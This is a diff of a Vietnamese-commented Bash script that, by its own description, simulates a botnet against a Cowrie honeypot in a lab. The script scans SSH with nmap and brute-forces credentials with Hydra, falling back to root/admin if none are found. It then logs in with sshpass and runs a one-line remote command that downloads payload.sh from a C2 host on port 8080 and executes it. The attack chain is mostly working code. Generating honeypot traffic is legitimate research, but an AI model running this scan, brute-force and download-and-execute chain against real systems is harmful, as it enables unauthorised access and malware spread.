@@ -1,7 +1,7 @@
 #!/usr/bin/env bash
 # ============================================
-# Mô phỏng botnet cho Cowrie (T-Pot) - BẢN ỔN ĐỊNH
-# Chỉ dùng trong LAB / HONEYPOT hợp pháp (VD: T-Pot).
+# Mô phỏng botnet cho Cowrie (T-Pot) - BẢN ỔN ĐỊNH (chỉ dùng wget)
+# Dùng trong LAB/HONEYPOT hợp pháp (VD: T-Pot)
 # ============================================
 
 set -euo pipefail
@@ -18,18 +18,17 @@ usage() { echo "Usage: $0 <T-POT_IP> <KALI_IP> [TPOT_PORT]"; exit 1; }
 say()  { printf "%s\n" "$*"; }
 need() { command -v "$1" >/dev/null 2>&1 || { say "[!] Thiếu công cụ: $1"; exit 1; }; }
 
-for t in nmap hydra sshpass curl awk sed grep; do need "$t"; done
-# wget có thể thiếu, nhưng ta sẽ fallback (curl || wget) trên máy đích.
+# Chỉ yêu cầu các tool cần thiết (không dùng curl)
+for t in nmap hydra sshpass wget awk sed grep; do need "$t"; done
 
 TMPDIR="$(mktemp -d)"
-cleanup() {
-  rm -rf "$TMPDIR" 2>/dev/null || true
-}
+cleanup() { rm -rf "$TMPDIR" 2>/dev/null || true; }
 trap cleanup EXIT
 
-# --------- Kiểm tra C2 ----------
+# --------- Kiểm tra C2 (chỉ dùng wget) ----------
 say "[*] Kiểm tra C2: http://${KALI_IP}:8080/payload.sh ..."
-if ! curl -fsS --max-time 5 "http://${KALI_IP}:8080/payload.sh" >/dev/null; then
+# --spider: kiểm tra tồn tại; -q yên lặng; --timeout 5 giây
+if ! wget --spider -q --timeout=5 "http://${KALI_IP}:8080/payload.sh"; then
   say "[!] Không truy cập được payload.sh tại ${KALI_IP}:8080"
   say "    - Trên Kali:  cd ~/c2server && python3 -m http.server 8080"
   say "    - Firewall:   sudo ufw allow 8080/tcp (nếu dùng ufw)"
@@ -39,7 +38,7 @@ say "[+] C2 OK."
 
 # --------- Quét cổng ----------
 say "[*] Quét cổng SSH ${TPOT_IP}:${TPOT_PORT} ..."
-# Không fail nếu nmap non-zero (dùng || true)
+# Không fail nếu nmap trả mã khác 0
 nmap -sT -Pn -p "${TPOT_PORT}" "${TPOT_IP}" || true
 
 # --------- Chuẩn bị wordlists ----------
@@ -57,9 +56,6 @@ EOF
 # --------- Brute-force với Hydra ----------
 say "[*] Brute-force bằng Hydra ..."
 HYDRA_OUT="${TMPDIR}/hydra.out"
-# -f: dừng khi tìm thấy cặp hợp lệ
-# -t 4: 4 thread là đủ cho lab
-# -s: port SSH tuỳ chọn
 hydra -L "${USERS}" -P "${PWDS}" -t 4 -V -f -o "${HYDRA_OUT}" "ssh://${TPOT_IP}" -s "${TPOT_PORT}" || true
 
 # --------- Parse kết quả ----------
@@ -69,27 +65,27 @@ PASS_FOUND="$(awk '/\[ssh\] host:/ && /login:/ && /password:/ {for(i=1;i<=NF;i++
 if [[ -n "${USER_FOUND}" && -n "${PASS_FOUND}" ]]; then
   USER="${USER_FOUND}"
   PASS="${PASS_FOUND}"
-  say "[+] Tìm thấy cred từ Hydra: ${USER} / ${PASS}"
+  say "[+] Dùng cred: ${USER} / ${PASS}"
 else
   say "[!] Hydra KHÔNG tìm thấy cred → dùng mặc định LAB: root / admin"
   USER="root"
   PASS="admin"
 fi
 
-# --------- Chuỗi lệnh từ xa (một dòng) ----------
-# Dùng sh -lc để có login shell nhẹ, dùng ; thay vì && để giảm rủi ro 'gãy dòng'
-# Ưu tiên curl, fallback wget. Không dùng subshell () để hợp thức với shell tối giản.
-REMOTE_CMD=$(
-  cat <<EOF
-sh -lc 'cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; \
-  (curl -fsS http://${KALI_IP}:8080/payload.sh -o payload.sh || \
-   wget -qO payload.sh http://${KALI_IP}:8080/payload.sh); \
-  chmod +x payload.sh; ./payload.sh'
-EOF
-)
+# --------- Chuỗi lệnh từ xa (CHỈ wget, không (), không &&, không ||) ----------
+# Dùng -T (no-tty) để Cowrie xử lý ổn định hơn.
+# Lệnh dạng hiền: chỉ ;, if, test. Tải về /tmp/payload.sh rồi thực thi.
+REMOTE_CMD='sh -c "
+cd /tmp;
+rm -f payload.sh;
+wget -q -O payload.sh http://'${KALI_IP}':8080/payload.sh;
+if [ ! -s payload.sh ]; then echo '\''[!] payload.sh rỗng/không tải được'\''; exit 10; fi;
+chmod +x payload.sh;
+sh payload.sh
+"'
 
 # --------- SSH thực thi ----------
-say "[*] SSH vào Cowrie & chạy chuỗi lệnh tải/chạy payload ..."
+say "[*] SSH vào Cowrie & chạy payload (wget) ..."
 set +e
 sshpass -p "${PASS}" ssh \
   -o StrictHostKeyChecking=no \
@@ -100,13 +96,14 @@ sshpass -p "${PASS}" ssh \
   -o ServerAliveInterval=5 \
   -o ServerAliveCountMax=2 \
   -p "${TPOT_PORT}" \
-  -tt "${USER}@${TPOT_IP}" "${REMOTE_CMD}"
+  -T "${USER}@${TPOT_IP}" "${REMOTE_CMD}"
 SSH_RC=$?
 set -e
 
 if [[ ${SSH_RC} -ne 0 ]]; then
-  say "[!] SSH/Payload lỗi (mã: ${SSH_RC}). Có thể do Cowrie đóng phiên hoặc shell không hỗ trợ."
-  say "    Thử bỏ pseudo-TTY: đổi -tt thành -T, hoặc rút gọn REMOTE_CMD."
+  say "[!] SSH/Payload lỗi (mã: ${SSH_RC}). Có thể do Cowrie đóng phiên sớm hoặc mạng từ container không ra được KALI_IP:8080."
+  say "    Gợi ý: kiểm tra kết nối từ trong container Cowrie:"
+  say "           docker exec -it cowrie sh -lc \"wget -qO- http://${KALI_IP}:8080/payload.sh | head\""
   exit 3
 fi
 
